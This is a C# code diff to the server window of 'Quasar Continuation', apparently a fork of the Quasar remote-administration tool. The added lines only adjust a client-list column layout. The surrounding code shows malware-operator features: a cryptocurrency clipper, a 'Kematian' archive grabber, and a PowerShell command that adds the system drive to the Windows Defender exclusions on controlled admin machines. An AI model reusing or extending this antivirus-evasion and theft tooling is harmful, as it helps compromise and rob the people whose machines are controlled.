@@ -182,6 +182,21 @@ namespace Quasar.Server.Forms
 
         private void FrmMain_Load(object sender, EventArgs e)
         {
+            int accountTypeIndex = -1;
+            for (int i = 0; i < lstClients.Columns.Count; i++)
+            {
+                if (lstClients.Columns[i] == hAccountType)
+                {
+                    accountTypeIndex = i;
+                    break;
+                }
+            }
+            
+            if (accountTypeIndex >= 0)
+            {
+                lstClients.StretchColumnByIndex(accountTypeIndex);
+            }
+            
             EventLog("Welcome to Quasar Continuation.", "info");
             InitializeServer();
             AutostartListening();
@@ -202,6 +217,16 @@ namespace Quasar.Server.Forms
             BCHTextBox.TextChanged += CryptoTextBox_TextChanged;
 
             ClipperCheckbox.CheckedChanged += ClipperCheckbox_CheckedChanged2;
+            
+            lstClients.ColumnWidthChanging += lstClients_ColumnWidthChanging;
+        }
+
+        private void lstClients_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
+        {
+            if (e.ColumnIndex != hAccountType.Index)
+            {
+                lstClients.StretchColumnByIndex(hAccountType.Index);
+            }
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -477,20 +502,20 @@ namespace Quasar.Server.Forms
                         new KematianHandler(client).RequestKematianZip();
                         break;
                     case "Exclude System Drives":
-                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                         }
                         break;
                     case "Message Box":
-                        client.Send(new DoShowMessageBox
-                        {
-                            Caption = subItem0,
-                            Text = subItem1,
-                            Button = "OK",
-                            Icon = "None"
-                        });
+                    client.Send(new DoShowMessageBox
+                    {
+                        Caption = subItem0,
+                        Text = subItem1,
+                        Button = "OK",
+                        Icon = "None"
+                    });
                         break;
                 }
             }
@@ -1575,6 +1600,21 @@ namespace Quasar.Server.Forms
 
         private void lstClients_Resize(object sender, EventArgs e)
         {
+            int accountTypeIndex = -1;
+            for (int i = 0; i < lstClients.Columns.Count; i++)
+            {
+                if (lstClients.Columns[i] == hAccountType)
+                {
+                    accountTypeIndex = i;
+                    break;
+                }
+            }
+            
+            if (accountTypeIndex >= 0)
+            {
+                lstClients.StretchColumnByIndex(accountTypeIndex);
+            }
+            
             UpdateAllStarPositions();
         }
 
@@ -1646,7 +1686,9 @@ namespace Quasar.Server.Forms
         }
 
         private void lstClients_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
-        {
+        { 
+            if (!lstClients.IsStretched(hAccountType.Index))
+            { lstClients.StretchColumnByIndex(hAccountType.Index); }
             UpdateAllStarPositions();
         }
 
